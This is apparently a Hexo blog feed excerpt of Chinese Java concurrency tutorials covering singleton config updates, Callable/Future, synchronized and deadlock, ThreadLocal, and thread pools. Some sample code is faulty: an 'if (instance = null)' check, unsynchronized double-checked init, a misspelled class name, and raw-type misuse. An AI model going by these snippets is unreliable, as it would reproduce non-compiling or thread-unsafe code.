<h4 id="1-参照读者-x2F-写者的处理方式"><a href="#1-参照读者-x2F-写者的处理方式" class="headerlink" title="1.参照读者&#x2F;写者的处理方式"></a>1.参照读者&#x2F;写者的处理方式</h4><p>设置一个读计数器，每次读取配置信息前，将计数器加1，读完后将计数器减1。只有在读计数器为0时，才能更新数据，同时要阻塞所有读属性的调用。代码如下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class GlobalConfig &#123;</span><br><span class="line">  private static GlobalConfig instance;</span><br><span class="line">  private Vector properties = null;</span><br><span class="line">  private boolean isUpdating = false;</span><br><span class="line">  private int readCount = 0;</span><br><span class="line">  private GlobalConfig() &#123;</span><br><span class="line">    //Load configuration information from DB or file</span><br><span class="line">    //Set values for properties</span><br><span class="line">  &#125;</span><br><span class="line">  private static synchronized void syncInit() &#123;</span><br><span class="line">      if (instance == null) &#123;</span><br><span class="line">          instance = new GlobalConfig();</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  public static GlobalConfig getInstance() &#123;</span><br><span class="line">      if (instance==null) &#123;</span><br><span class="line">          syncInit();</span><br><span class="line">      &#125;</span><br><span class="line">      return instance;</span><br><span class="line">  &#125;</span><br><span class="line">  public synchronized void update(String p_data) &#123;</span><br><span class="line">      syncUpdateIn();</span><br><span class="line">      //Update properties</span><br><span class="line">  &#125;</span><br><span class="line">  private synchronized void syncUpdateIn() &#123;</span><br><span class="line">      while (readCount &gt; 0) &#123;</span><br><span class="line">          try &#123;</span><br><span class="line">              wait();</span><br><span class="line">          &#125; catch (Exception e) &#123;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  private synchronized void syncReadIn() &#123;</span><br><span class="line">      readCount++;</span><br><span class="line">  &#125;</span><br><span class="line">  private synchronized void syncReadOut() &#123;</span><br><span class="line">      readCount--;</span><br><span class="line">      notifyAll();</span><br><span class="line">  &#125;</span><br><span class="line">  public Vector getProperties() &#123;</span><br><span class="line">      syncReadIn();</span><br><span class="line">      //Process data</span><br><span class="line">      syncReadOut();</span><br><span class="line">      return properties;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-采用”影子实例”的办法"><a href="#2-采用”影子实例”的办法" class="headerlink" title="2.采用”影子实例”的办法"></a>2.采用”影子实例”的办法</h4><p>具体说，就是在更新属性时，直接生成另一个单例对象实例，这个新生成的单例对象实例将从数据库或文件中读取最新的配置信息；然后将这些配置信息直接赋值给旧单例对象的属性。如下面代码所示。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class GlobalConfig &#123;</span><br><span class="line">  private static GlobalConfig instance = null;</span><br><span class="line">  private Vector properties = null;</span><br><span class="line">  private GlobalConfig() &#123;</span><br><span class="line">    //Load configuration information from DB or file</span><br><span class="line">    //Set values for properties</span><br><span class="line">  &#125;</span><br><span class="line">  private static synchronized void syncInit() &#123;</span><br><span class="line">    if (instance = null) &#123;</span><br><span class="line">      instance = new GlobalConfig();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  public static GlobalConfig getInstance() &#123;</span><br><span class="line">    if (instance = null) &#123;</span><br><span class="line">      syncInit();</span><br><span class="line">    &#125;</span><br><span class="line">    return instance;</span><br><span class="line">  &#125;</span><br><span class="line">  public Vector getProperties() &#123;</span><br><span class="line">    return properties;</span><br><span class="line">  &#125;</span><br><span class="line">  public void updateProperties() &#123;</span><br><span class="line">    //Load updated configuration information by new a GlobalConfig object</span><br><span class="line">    GlobalConfig shadow = new GlobalConfig();</span><br><span class="line">    properties = shadow.getProperties();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意：在更新方法中，通过生成新的GlobalConfig的实例，从文件或数据库中得到最新配置信息，并存放到properties属性中。</p>
<p>上面两个方法比较起来，第二个方法更好，首先，编程更简单；其次，没有那么多的同步操作，对性能的影响也不大。</p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>BASE</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA线程池submit和Future的使用</title>
    <url>/blog/plang/java/threadsafe/submitfuture/</url>
    <content><![CDATA[<p>在Java5之后，任务分两类：一类是实现了<code>Runnable</code>接口的类，一类是实现了<code>Callable</code>接口的类。两者都可以被<code>ExecutorService</code>执行，但是<code>Runnable</code>任务没有返回值，而<code>Callable</code>任务有返回值。并且<code>Callable</code>的<code>call()</code>方法只能通过<code>ExecutorService</code>的<code>submit(Callable&lt;t&gt; task)</code> 方法来执行，并且返回一个<code>Future</code>，是表示任务等待完成的 <code>Future</code>。</p>
<pre><code>public interface Callable&lt;v&gt;
</code></pre>
<p>返回结果并且可能抛出异常的任务。实现者定义了一个不带任何参数的叫做 <code>call</code> 的方法。</p>
<p><code>Callable</code> 接口类似于 <code>Runnable</code>，两者都是为那些其实例可能被另一个线程执行的类设计的。但是 <code>Runnable</code> 不会返回结果，并且无法抛出经过检查的异常。</p>
<p><code>Callable</code>中的<code>call()</code>方法类似<code>Runnable</code>的<code>run()</code>方法，就是前者有返回值，后者没有。</p>
<p>当将一个<code>Callable</code>的对象传递给<code>ExecutorService</code>的<code>submit</code>方法，则该<code>call</code>方法自动在一个线程上执行，并且会返回执行结果<code>Future</code>对象。</p>
<p>同样，将<code>Runnable</code>的对象传递给<code>ExecutorService</code>的<code>submit</code>方法，则该<code>run</code>方法自动在一个线程上执行，并且会返回执行结果<code>Future</code>对象，但是在该<code>Future</code>对象上调用get方法，将返回null。</p>
<p>注意：<code>Future</code>的<code>get</code>方法是阻塞方法，它会一直等到线程返回结果才会继续执行。</p>
<p>下面给个例子：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.util.ArrayList;</span><br><span class="line">import java.util.List;</span><br><span class="line">import java.util.concurrent.*;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line">* Callable接口测试</span><br><span class="line">*/</span><br><span class="line">public class CallableDemo &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        ExecutorService executorService = Executors.newCachedThreadPool();</span><br><span class="line">        List&lt;Future&lt;String&gt;&gt; resultList = new ArrayList&lt;Future&lt;String&gt;&gt;();</span><br><span class="line"></span><br><span class="line">        //创建10个任务并执行</span><br><span class="line">        for (int i = 0; i &lt; 10; i++) &#123;</span><br><span class="line">            //使用ExecutorService执行Callable类型的任务，并将结果保存在future变量中 </span><br><span class="line">            Future&lt; String&gt; future = executorService</span><br><span class="line">                    .submit(new TaskWithResult(i));</span><br><span class="line">            //将任务执行结果存储到List中</span><br><span class="line">            resultList.add(future);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        //遍历任务的结果</span><br><span class="line">        for (Future&lt;String&gt; fs : resultList) &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                System.out.println(fs.get()); //打印各个线程（任务）执行的结果 </span><br><span class="line">            &#125; catch (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125; catch (ExecutionException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125; finally &#123;</span><br><span class="line">                //启动一次顺序关闭，执行以前提交的任务，但不接受新任务。如果已经关闭，则调用没有其他作用。</span><br><span class="line">                executorService.shutdown();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class TaskWithResult implements Callable&lt;String&gt; &#123;</span><br><span class="line">    private int id;</span><br><span class="line"></span><br><span class="line">    public TaskWithResult(int id) &#123;</span><br><span class="line">        this.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 任务的具体过程，一旦任务传给ExecutorService的submit方法，则该方法自动在一个线程上执行。 </span><br><span class="line">     *</span><br><span class="line">     * @return</span><br><span class="line">     * @throws Exception</span><br><span class="line">     */</span><br><span class="line">    public String call() throws Exception &#123;</span><br><span class="line">        System.out.println(&quot;call()方法被自动调用,干活！！！             &quot;</span><br><span class="line">                + Thread.currentThread().getName());</span><br><span class="line">        //一个模拟耗时的操作</span><br><span class="line">        Thread.sleep(1000);</span><br><span class="line">        return &quot;call()方法被自动调用，任务的结果是：&quot; + id + &quot;    &quot;</span><br><span class="line">                + Thread.currentThread().getName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>线程安全</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>线程安全</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA同步之synchronized关键字的使用</title>
    <url>/blog/plang/java/threadsafe/synchronized/</url>
    <content><![CDATA[<p>synchronized是针对对象的隐式锁使用的，注意是对象！</p>
<p>举个小例子，该例子没有任何业务含义，只是为了说明synchronized的基本用法：</p>
<pre><code>Class MyClass()&#123;
  synchronized void myFunction()&#123;
    //do something
  &#125;
&#125;

public static void main()&#123;
  MyClass myClass = new MyClass();
  myClass.myFunction();
&#125;
</code></pre>
<p>myFunction()方法是个同步方法，隐式锁是谁的？答：是该方法所在类的对象。</p>
<p>看看怎么使用的：myClass.myFunction();很清楚了吧，隐式锁是myClass的。</p>
<p>说的在明白一点，线程想要执行myClass.myFunction();就要先获得myClass的锁。</p>
<p>下面总结一下：</p>
<p>1、synchronized关键字的作用域有二种：</p>
<p>1）是某个对象实例内，synchronized aMethod(){}可以防止多个线程同时访问这个对象的synchronized方法（如果一个对象有多个synchronized方法，只要一个线程访问了其中的一个synchronized方法，其它线程不能同时访问这个对象中任何一个synchronized方法）。这时，不同的对象实例的synchronized方法是不相干扰的。也就是说，其它线程照样可以同时访问相同类的另一个对象实例中的synchronized方法；</p>
<p>2）是某个类的范围，synchronized static aStaticMethod{}防止多个线程同时访问这个类中的synchronized static方法。它可以对类的所有对象实例起作用。（注：这个可以认为是对Class对象起作用）</p>
<p>2、除了方法前用synchronized关键字，synchronized关键字还可以用于方法中的某个区块中，表示只对这个区块的资源实行互斥访问。用法是:</p>
<p>synchronized(this){&#x2F;*区块*&#x2F;}，它的作用域是this，即是当前对象。当然这个括号里可以是任何对象，synchronized对方法和块的含义和用法并无本质不同；</p>
<p>3、synchronized关键字是不能继承的，也就是说，基类的方法synchronized f(){} 在继承类中并不自动是synchronized f(){}，而是变成了f(){}。继承类需要你显式的指定它的某个方法为synchronized方法；</p>
<p>synchronized可能造成死锁，比如：</p>
<pre><code>    class DeadLockSample&#123;
        public final Object lock1 = new Object();
        public final Object lock2 = new Object();

        public void methodOne()&#123;
           synchronized(lock1)&#123;
              ...
              synchronized(lock2)&#123;...&#125;
           &#125;
        &#125;

        public void methodTwo()&#123;
           synchronized(lock2)&#123;
          ...
              synchronized(lock1)&#123;...&#125;
           &#125;
        &#125;
    &#125;
</code></pre>
<p>假设场景：线程A调用methodOne()，获得lock1的隐式锁后，在获得lock2的隐式锁之前线程B进入运行，调用methodTwo()，抢先获得了lock2的隐式锁，此时线程A等着线程B交出lock2，线程B等着lock1进入方法块，死锁就这样被创造出来了。</p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>线程安全</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>线程安全</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA同步之ThreadLocal的使用</title>
    <url>/blog/plang/java/threadsafe/threadlocal/</url>
    <content><![CDATA[<p>当多个线程可以访问一个对象的实例变量时，这个实例变量是线程不安全的。如果我们想保证变量的原子性可以用Synchonized来解决。如果我们想让每个线程都有自己的实例变量怎么办？</p>
<p>比如一个Servlet中众多方法要使用数据库的查询内容，但每个请求的查询内容是不同的，这就要求方法在获取数据库查询内容时是指定线程查出来的。这时就要用到ThreadLocal。</p>
<p>ThreadLocal的实现原理很简单，每个Thread都有一个MAP，叫做threadLocals。</p>
<pre><code>public
class Thread implements Runnable &#123;
    ...
    ThreadLocal.ThreadLocalMap threadLocals = null;
    ...
&#125;
</code></pre>
<p>ThreadLocal主要用两个方法：</p>
<p>void set(Object obj) 设置当前线程的变量的副本的值。</p>
<p>Object get() 返回当前线程的变量副本</p>
<p>看一下具体实现：</p>
<pre><code>    public T get() &#123;
        Thread t = Thread.currentThread();
        ThreadLocalMap map = getMap(t);
        if (map != null) &#123;
            ThreadLocalMap.Entry e = map.getEntry(this);
            if (e != null)
                return (T)e.value;
        &#125;
        return setInitialValue();
    &#125;
    public void set(T value) &#123;
        Thread t = Thread.currentThread();
        ThreadLocalMap map = getMap(t);
        if (map != null)
            map.set(this, value);
        else
            createMap(t, value);
    &#125;
</code></pre>
<p>它设置的是当前线程中的threadLocals这个MAP，Map的key是ThreadLocal对象本身的实例。</p>
<p>来一个例子：</p>
<pre><code>    public class ThreadLocalDemo implements Runnable &#123;
       private final static  ThreadLocal studentLocal = new ThreadLocal();  //ThreadLocal对象在这

       public static void main(String[] agrs) &#123;
           TreadLocalDemo td = new TreadLocalDemo();
             Thread t1 = new Thread(td,&quot;a&quot;);
             Thread t2 = new Thread(td,&quot;b&quot;);
            t1.start();
            t2.start();
          &#125;

        public void run() &#123;
             accessStudent();
        &#125;

        public  void  accessStudent() &#123;
            String currentThreadName = Thread.currentThread().getName();
            System.out.println(currentThreadName+&quot; is running!&quot;);
            Random random = new Random();
            int age = random.nextInt(100);
            System.out.println(&quot;thread &quot;+currentThreadName +&quot; set age to:&quot;+age);
            Student student = getStudent();  //每个线程都独立维护一个Student变量
            student.setAge(age);
            System.out.println(&quot;thread &quot;+currentThreadName+&quot; first  read age is:&quot;+student.getAge());
            try &#123;
            Thread.sleep(5000);
            &#125;
            catch(InterruptedException ex) &#123;
                ex.printStackTrace();
            &#125;
            System.out.println(&quot;thread &quot;+currentThreadName +&quot; second read age is:&quot;+student.getAge());

        &#125;

        protected Student getStudent() &#123;
            Student student = (Student)studentLocal.get();  //从ThreadLocal对象中取
            if(student == null) &#123;
                student = new Student();
                studentLocal.set(student);  //如果没有就创建一个
            &#125;
            return student;
        &#125;

        protected void setStudent(Student student) &#123;
            studentLocal.set(student);  //放入ThreadLocal对象中
        &#125;
    &#125;
</code></pre>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>线程安全</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>线程安全</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA同步之ThreadLocal使用示例</title>
    <url>/blog/plang/java/threadsafe/threadlocalexample/</url>
    <content><![CDATA[<p>首先有几点需要大家清楚的：</p>
<ol>
<li><p>ThreadLocal只是对需要存储的对象的管理，而存储实际是由当前Thread负责。个人理解为ThreadLocal是一个操作Thread.<br>threadLocals 的工具。</p>
</li>
<li><p>使用ThreadLocal可以使对象达到线程隔离的目的。同一个ThreadLocal操作不同的Thread，实质是各个Thread对自己的变量操作。</p>
</li>
<li><p>为什么要使用ThreadLocal，个人感觉有两个原因，1是与其它线程的隔离，2是可以在一个线程的生命周期中使用同一个对象，达到对象传递的作用。这样的好处是可以减少dal访问或者ws调用。</p>
</li>
</ol>
<p>我这里列出一个用到ThreadLocal的例子，主要的作用是使用ThreadLocal记录用户信息以及记录用户的执行时间。这在实际应用中，可以映射为全局记录用户的权限，以及使用Threadlocal对系统的性能做一些分析等。。</p>
<p>首先有两个对象，一个是用户对象</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 简单记录用户是否可以访问，可以用于全局权限控制等</span><br><span class="line">class User &#123;</span><br><span class="line">    private String name;</span><br><span class="line">    private boolean isAllow;</span><br><span class="line">    public User(String name, boolean isAllow) &#123;</span><br><span class="line">        this.name = name;</span><br><span class="line">        this.isAllow = isAllow;</span><br><span class="line">    &#125;</span><br><span class="line">    public String getName() &#123;</span><br><span class="line">        return name;</span><br><span class="line">    &#125;</span><br><span class="line">    public boolean isAllow() &#123;</span><br><span class="line">        return isAllow;</span><br><span class="line">    &#125;</span><br><span class="line">    @Override</span><br><span class="line">    public String toString() &#123;</span><br><span class="line">        return &quot;用户名：&quot; + name + &quot;\t 是否允许访问：&quot; + isAllow;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 用于记录每一步骤耗时…,可以用于每一步的性能分析</span><br><span class="line">class TimeConsumer &#123;</span><br><span class="line">    // 名称</span><br><span class="line">    private String name;</span><br><span class="line">    // 耗时数据列表</span><br><span class="line">    private List steps;</span><br><span class="line">    public TimeConsumer(String name, long start) &#123;</span><br><span class="line">        this.name = name;</span><br><span class="line">        steps = new ArrayList();</span><br><span class="line">        steps.add(start);</span><br><span class="line">    &#125;</span><br><span class="line">    public void andStep(long step) &#123;</span><br><span class="line">        steps.add(step);</span><br><span class="line">    &#125;</span><br><span class="line">    @Override</span><br><span class="line">    public String toString() &#123;</span><br><span class="line">        StringBuffer br = new StringBuffer(&quot;操作[&quot; + name + &quot;]共有&quot;</span><br><span class="line">                + (steps.size() - 1) + &quot;步\n&quot;);</span><br><span class="line">        for (int i = 1; i &lt; steps.size(); i++) &#123;</span><br><span class="line">            br.append(&quot;\t|--耗时[&quot; + (steps.get(i) - steps.get(0))</span><br><span class="line">                    + &quot;ms]\n&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        br.append(&quot;\n&quot;);</span><br><span class="line">        return br.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// threadlocal 管理类</span><br><span class="line">class MyThreadLocal &#123;</span><br><span class="line">    // 用于全局记录user访问权限</span><br><span class="line">    private ThreadLocal userLocal;</span><br><span class="line">    // 用于全局记录用户每一步的耗时</span><br><span class="line">    private ThreadLocal timeLocal;</span><br><span class="line">    private static MyThreadLocal local = new MyThreadLocal();</span><br><span class="line">    private MyThreadLocal() &#123;</span><br><span class="line">        userLocal = new ThreadLocal();</span><br><span class="line">        timeLocal = new ThreadLocal();</span><br><span class="line">    &#125;</span><br><span class="line">    public static MyThreadLocal getInstanse() &#123;</span><br><span class="line">        return local;</span><br><span class="line">    &#125;</span><br><span class="line">    public void addUser(User user) &#123;</span><br><span class="line">        userLocal.set(user);</span><br><span class="line">    &#125;</span><br><span class="line">    public User getUser() &#123;</span><br><span class="line">        return userLocal.get();</span><br><span class="line">    &#125;</span><br><span class="line">    public void addTime(TimeConsumer timeConsumer) &#123;</span><br><span class="line">        timeLocal.set(timeConsumer);</span><br><span class="line">    &#125;</span><br><span class="line">    public void addTime(long l) &#123;</span><br><span class="line">        TimeConsumer time = timeLocal.get();</span><br><span class="line">        timeLocal.remove();</span><br><span class="line">        time.andStep(l);</span><br><span class="line">        timeLocal.set(time);</span><br><span class="line">    &#125;</span><br><span class="line">    public TimeConsumer getTime() &#123;</span><br><span class="line">        return timeLocal.get();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public class CoreThreadLocal &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        new Thread(new TestRunnable(&quot;name1&quot;, 1000L, true)).start();</span><br><span class="line">        new Thread(new TestRunnable(&quot;name2&quot;, 700L, true)).start();</span><br><span class="line">        new Thread(new TestRunnable(&quot;name3&quot;, 888, false)).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 用于测试，多线程实现</span><br><span class="line">class TestRunnable implements Runnable &#123;</span><br><span class="line">    String name;</span><br><span class="line">    long l;</span><br><span class="line">    boolean isAllow;</span><br><span class="line">  TestRunnable(String name, long l, boolean isAllow) &#123;</span><br><span class="line">        this.name = name;</span><br><span class="line">        this.l = l;</span><br><span class="line">        this.isAllow = isAllow;</span><br><span class="line">    &#125;</span><br><span class="line">    public void run() &#123;</span><br><span class="line">        MyThreadLocal local = MyThreadLocal.getInstanse();</span><br><span class="line">        local.addUser(new User(name, isAllow));</span><br><span class="line">        local.addTime(new TimeConsumer(name, System.currentTimeMillis()));</span><br><span class="line">        // 做某个业务，并记录时间</span><br><span class="line">        doThings(l);</span><br><span class="line">        local.addTime(System.currentTimeMillis());</span><br><span class="line">        // 做某个业务，并记录时间</span><br><span class="line">        doThings(l);</span><br><span class="line">        local.addTime(System.currentTimeMillis());</span><br><span class="line">        // 业务做完，打印日志</span><br><span class="line">        System.out.println(local.getUser());</span><br><span class="line">        System.out.println(local.getTime());</span><br><span class="line">    &#125;</span><br><span class="line">    // 模拟具体业务的处理步骤</span><br><span class="line">    private void doThings(long l) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Thread.sleep(l);</span><br><span class="line">        &#125; catch (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行上面的程序得到结果如下：</p>
<pre><code>用户名：name2   是否允许访问：true
操作[name2]共有2步
    |--耗时[703ms]
    |--耗时[1406ms]


用户名：name3    是否允许访问：false
操作[name3]共有2步
    |--耗时[891ms]
    |--耗时[1781ms]


用户名：name1    是否允许访问：true
操作[name1]共有2步
    |--耗时[1000ms]
    |--耗时[2000ms]
</code></pre>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>线程安全</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>线程安全</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA同步之线程池简介</title>
    <url>/blog/plang/java/threadsafe/threadpool/</url>
    <content><![CDATA[<p><img src="/images/java/Executor-class_2.png" title="Executor-class_2"></p>
<p>Java里面线程池的顶级接口是Executor，但是严格意义上讲Executor并不是一个线程池，而只是一个执行线程的工具。<strong>真正的线程池接口是ExecutorService</strong>。</p>
<ol>
<li><code>ExecutorService</code>：真正的线程池接口。</li>
<li><code>ScheduledExecutorService</code>:能和Timer&#x2F;TimerTask类似，解决那些需要任务重复执行的问题。</li>
<li><code>ThreadPoolExecutor</code>: ExecutorService的默认实现。</li>
<li><code>ScheduledThreadPoolExecutor</code>:继承<code>ThreadPoolExecutor</code>的<code>ScheduledExecutorService</code>接口实现，周期性任务调度的类实现。</li>
</ol>
<h2 id="使用步骤"><a href="#使用步骤" class="headerlink" title="使用步骤"></a>使用步骤</h2><ol>
<li>创建执行对象，要实现<code>Runnable</code>接口，用线程类Thread也一样。</li>
<li>用<code>Executors</code>类或<code>ThreadPoolExecutor</code>创建线程池<code>ExecutorService</code>。</li>
<li>用<code>ExecutorService</code>的<code>execute(Runnable)</code>添加任务。</li>
<li>用<code>ExecutorService</code>的<code>shutdown()</code>关闭线程池，使之不可再加入新线程。</li>
<li>如是有必要，用<code>ExecutorServic</code>e的<code>awaitTermination(long timeout,TimeUnit unit)</code>方法阻塞主线程，等待所有任务执行结束。</li>
</ol>
<h2 id="Executors类"><a href="#Executors类" class="headerlink" title="Executors类"></a>Executors类</h2><p><code>Executors</code>类里面提供了一些静态工厂，生成一些常用的线程池。</p>
<h3 id="newSingleThreadExecutor"><a href="#newSingleThreadExecutor" class="headerlink" title="newSingleThreadExecutor"></a>newSingleThreadExecutor</h3><p>创建一个单线程的线程池。这个线程池只有一个线程在工作，也就是相当于单线程串行执行所有任务。如果这个唯一的线程因为异常结束，那么会有一个新的线程来替代它。此线程池保证所有任务的执行顺序按照任务的提交顺序执行。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ExecutorService pool = Executors.newSingleThreadExecutor();</span><br></pre></td></tr></table></figure>

<h3 id="newFixedThreadPool"><a href="#newFixedThreadPool" class="headerlink" title="newFixedThreadPool"></a>newFixedThreadPool</h3><p>创建固定大小的线程池。每次提交一个任务就创建一个线程，直到线程达到线程池的最大大小。线程池的大小一旦达到最大值就会保持不变，如果某个线程因为执行异常而结束，那么线程池会补充一个新线程。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ExecutorService pool = Executors.newFixedThreadPool(corePoolSize);</span><br></pre></td></tr></table></figure>

<h3 id="newCachedThreadPool"><a href="#newCachedThreadPool" class="headerlink" title="newCachedThreadPool"></a>newCachedThreadPool</h3><p>创建一个可缓存的线程池。如果线程池的大小超过了处理任务所需要的线程，那么就会回收部分空闲（60秒不执行任务）的线程，当任务数增加时，此线程池又可以智能的添加新线程来处理任务。此线程池不会对线程池大小做限制，线程池大小完全依赖于操作系统（或者说JVM）能够创建的最大线程大小。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ExecutorService pool = Executors.newCachedThreadPool();</span><br></pre></td></tr></table></figure>

<h3 id="newScheduledThreadPool"><a href="#newScheduledThreadPool" class="headerlink" title="newScheduledThreadPool"></a><strong>newScheduledThreadPool</strong></h3><p>创建一个大小无限的线程池。此线程池支持定时以及周期性执行任务的需求。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ExecutorService pool = Executors.newScheduledThreadPool(corePoolSize);</span><br></pre></td></tr></table></figure>

<h3 id="newSingleThreadScheduledExecutor"><a href="#newSingleThreadScheduledExecutor" class="headerlink" title="newSingleThreadScheduledExecutor"></a>newSingleThreadScheduledExecutor</h3><p>创建一个单线程的线程池。此线程池支持定时以及周期性执行任务的需求。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ExecutorService pool = Executors.newSingleThreadScheduledExecutor();</span><br></pre></td></tr></table></figure>

<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p><strong>固定线程池：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package BackStage;</span><br><span class="line">import java.util.concurrent.Executors;</span><br><span class="line">import java.util.concurrent.ExecutorService;</span><br><span class="line">public class JavaThreadPool &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">    // 创建一个可重用固定线程数的线程池</span><br><span class="line">    ExecutorService pool = Executors.newFixedThreadPool(2);</span><br><span class="line">    // 创建实现了Runnable接口对象，Thread对象当然也实现了Runnable接口</span><br><span class="line">    Thread t1 = new MyThread();</span><br><span class="line">    Thread t2 = new MyThread();</span><br><span class="line">    Thread t3 = new MyThread();</span><br><span class="line">    Thread t4 = new MyThread();</span><br><span class="line">    Thread t5 = new MyThread();</span><br><span class="line">    // 将线程放入池中进行执行</span><br><span class="line">    pool.execute(t1);</span><br><span class="line">    pool.execute(t2);</span><br><span class="line">    pool.execute(t3);</span><br><span class="line">    pool.execute(t4);</span><br><span class="line">    pool.execute(t5);</span><br><span class="line">    // 关闭线程池</span><br><span class="line">    pool.shutdown();</span><br><span class="line">    //等待任务执行完成，最长阻塞60秒</span><br><span class="line">    pool.awaitTermination(60, TimeUnit.SECONDS);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class MyThread extends Thread &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public void run() &#123;</span><br><span class="line">    System.out.println(Thread.currentThread().getName() + &quot;正在执行。。。&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>定时线程池：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.util.concurrent.Executors;</span><br><span class="line">import java.util.concurrent.ScheduledExecutorService;</span><br><span class="line">import java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * Java线程：线程池</span><br><span class="line"> */</span><br><span class="line">public class Test</span><br><span class="line">&#123;</span><br><span class="line">    public static void main(String[] args)</span><br><span class="line">    &#123;</span><br><span class="line">        // 创建一个线程池，它可安排在给定延迟后运行命令或者定期地执行。</span><br><span class="line">        ScheduledExecutorService pool = Executors.newScheduledThreadPool(2);</span><br><span class="line">       // 创建实现了Runnable接口对象，Thread对象当然也实现了Runnable接口</span><br><span class="line">        Thread t1 = new MyThread();</span><br><span class="line">        Thread t2 = new MyThread();</span><br><span class="line">        Thread t3 = new MyThread();</span><br><span class="line">        Thread t4 = new MyThread();</span><br><span class="line">        Thread t5 = new MyThread();</span><br><span class="line">        // 将线程放入池中进行执行</span><br><span class="line">        pool.execute(t1);</span><br><span class="line">        pool.execute(t2);</span><br><span class="line">        pool.execute(t3);</span><br><span class="line">        // 使用延迟执行风格的方法</span><br><span class="line">        //t4,t5每10秒执行一次</span><br><span class="line">        pool.schedule(t4, 10, TimeUnit.SECONDS); </span><br><span class="line">        pool.schedule(t5, 10, TimeUnit.SECONDS);</span><br><span class="line">        // 关闭线程池</span><br><span class="line">        pool.shutdown();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class MyThread extends Thread</span><br><span class="line">&#123;</span><br><span class="line">    @Override</span><br><span class="line">    public void run()</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(Thread.currentThread().getName() + &quot;正在执行。。。&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="ThreadPoolExecutor"><a href="#ThreadPoolExecutor" class="headerlink" title="ThreadPoolExecutor"></a>ThreadPoolExecutor</h1><hr>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public ThreadPoolExecutor(int corePoolSize,</span><br><span class="line">                           int maximumPoolSize,</span><br><span class="line">                           long keepAliveTime,</span><br><span class="line">                           TimeUnit unit,</span><br><span class="line">                           BlockingQueue&lt; runnable&gt; workQueue,</span><br><span class="line">                           ThreadFactory threadFactory,</span><br><span class="line">                           RejectedExecutionHandler handler)</span><br></pre></td></tr></table></figure>

<p>参数：</p>
<ol>
<li><code>corePoolSize</code> – 池中所保存的线程数，包括空闲线程。</li>
